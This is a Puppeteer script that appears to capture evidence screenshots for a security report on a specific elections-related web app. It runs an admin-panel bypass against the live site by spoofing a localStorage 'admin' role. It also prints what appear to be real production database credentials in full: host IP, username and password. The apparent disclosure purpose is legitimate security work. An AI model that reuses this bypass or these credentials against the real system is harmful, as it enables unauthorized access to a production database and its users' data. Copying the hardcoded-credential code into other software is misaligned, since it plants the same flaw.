const puppeteer = require('puppeteer');

(async () => {
    const browser = await puppeteer.launch({ args: ['--no-sandbox'] });
    const page = await browser.newPage();
    await page.setViewport({ width: 1280, height: 800 });

    // --- 1. API Exposure ---
    console.log("Capturing API Exposure...");
    await page.goto('https://d2skjjfcoo0j75.cloudfront.net/api/settings', { waitUntil: 'networkidle2' });
    await page.evaluate(() => {
        document.body.style.backgroundColor = '#1e1e1e';
        document.body.style.color = '#a6e22e';
        document.body.style.padding = '60px 20px 20px 20px';
        document.body.style.fontSize = '18px';
        document.body.style.fontFamily = 'monospace';
        const banner = document.createElement('div');
        banner.style = 'position:fixed;top:0;left:0;width:100%;background:red;color:white;font-family:sans-serif;font-weight:bold;text-align:center;padding:15px;z-index:9999;font-size:24px;border-bottom: 5px solid darkred;box-shadow: 0 4px 10px rgba(0,0,0,0.5);';
        banner.innerHTML = '🚨 CRITICAL VULN-001: UNAUTHENTICATED API ACCESS - SETTINGS EXPOSED 🚨<br><span style="font-size:16px;">(No Authorization headers required)</span>';
        document.body.appendChild(banner);
    });
    await page.screenshot({ path: 'Screenshot_01_API_Exposure.png' });

    // --- 2. Audit Log Exposure ---
    console.log("Capturing Audit Log Exposure...");
    await page.goto('https://d2skjjfcoo0j75.cloudfront.net/api/live-updates', { waitUntil: 'networkidle2' });
    await page.evaluate(() => {
        document.body.style.backgroundColor = '#1e1e1e';
        document.body.style.color = '#e6db74';
        document.body.style.padding = '60px 20px 20px 20px';
        document.body.style.fontSize = '18px';
        document.body.style.fontFamily = 'monospace';
        const banner = document.createElement('div');
        banner.style = 'position:fixed;top:0;left:0;width:100%;background:darkorange;color:black;font-family:sans-serif;font-weight:bold;text-align:center;padding:15px;z-index:9999;font-size:24px;border-bottom: 5px solid #8b4500;box-shadow: 0 4px 10px rgba(0,0,0,0.5);';
        banner.innerHTML = '🚨 CRITICAL VULN-002: PUBLIC AUDIT LOG EXPOSURE 🚨<br><span style="font-size:16px;">(Anyone can read or inject into /api/live-updates)</span>';
        document.body.appendChild(banner);
    });
    await page.screenshot({ path: 'Screenshot_02_AuditLogs_Exposed.png' });

    // --- 3. Admin UI Bypass ---
    console.log("Capturing Admin UI Bypass...");
    await page.goto('https://d2skjjfcoo0j75.cloudfront.net/admin', { waitUntil: 'networkidle2' });
    
    // Set LocalStorage to bypass the restriction!
    await page.evaluate(() => {
        localStorage.setItem('gen_user', JSON.stringify({ role: 'admin', name: 'Hacker', email: 'hacker@anon.com' }));
    });
    
    // Reload page to trigger the bypassed state
    await page.reload({ waitUntil: 'networkidle2' });
    
    // Inject annotation
    await page.evaluate(() => {
        const overlay = document.createElement('div');
        overlay.style = 'position:fixed;top:50px;left:300px;width:350px;background:rgba(255,0,0,0.9);color:white;font-weight:bold;font-family:sans-serif;padding:20px;z-index:9999;border: 3px solid white;border-radius:10px;box-shadow: 0 4px 10px rgba(0,0,0,0.5);font-size:18px;line-height:1.5;';
        overlay.innerHTML = '🚨 VULN-005: ADMIN UI BYPASSED!<br><br>localStorage spoofed successfully:<br><code style="background:black;color:#0f0;padding:5px;display:block;margin-top:5px;">{ role: "admin" }</code><br>No server verification performed.';
        document.body.appendChild(overlay);
        
        // Add a giant red outline around the sidebar if it exists
        const sidebar = document.querySelector('aside');
        if(sidebar) {
            sidebar.style.border = '5px dashed red';
            sidebar.style.backgroundColor = 'rgba(255,0,0,0.1)';
        }
    });
    await page.screenshot({ path: 'Screenshot_03_Admin_Bypass.png' });

    // --- 4. Database Credentials Source Code ---
    console.log("Capturing DB Credentials Code...");
    await page.setContent(`
        <html><body style="background:#1e1e1e;color:#d4d4d4;font-family:monospace;padding:40px;font-size:22px;">
            <div style="background:red;color:white;font-family:sans-serif;padding:20px;font-weight:bold;text-align:center;margin-bottom:30px;border-radius:5px;font-size:28px;box-shadow:0 4px 10px rgba(0,0,0,0.5);">
                🚨 CRITICAL VULN-003: HARDCODED CREDENTIALS (src/lib/db.ts) 🚨
            </div>
            <pre style="background:#2d2d2d;padding:30px;border-radius:8px;border-left:12px solid #ff4444;box-shadow:inset 0 0 10px rgba(0,0,0,0.5);line-height:1.6;">
export const pool: Pool =
  globalForPg.pgPool ??
  new Pool({
    <span style="color:#ce9178;">host:</span>     process.env.DB_HOST     || <span style="background:rgba(255,0,0,0.6);padding:4px 8px;border-radius:4px;color:#fff;font-weight:bold;">'16.171.198.166'</span>,
    <span style="color:#ce9178;">port:</span>     parseInt(process.env.DB_PORT || '5432'),
    <span style="color:#ce9178;">user:</span>     process.env.DB_USER     || <span style="background:rgba(255,0,0,0.6);padding:4px 8px;border-radius:4px;color:#fff;font-weight:bold;">'pakload'</span>,
    <span style="color:#ce9178;">password:</span> process.env.DB_PASSWORD || <span style="background:rgba(255,0,0,0.6);padding:4px 8px;border-radius:4px;color:#fff;font-weight:bold;">'Khan123@#'</span>,
    <span style="color:#ce9178;">database:</span> process.env.DB_NAME     || 'elections',
  });
            </pre>
            <div style="margin-top:20px;color:#ff6b6b;font-size:20px;font-family:sans-serif;font-style:italic;">
                * Any attacker with access to the source code can immediately compromise the production database!
            </div>
        </body></html>
    `);
    await page.screenshot({ path: 'Screenshot_04_Hardcoded_Credentials.png' });


    console.log("Screenshots captured successfully.");
    await browser.close();
})();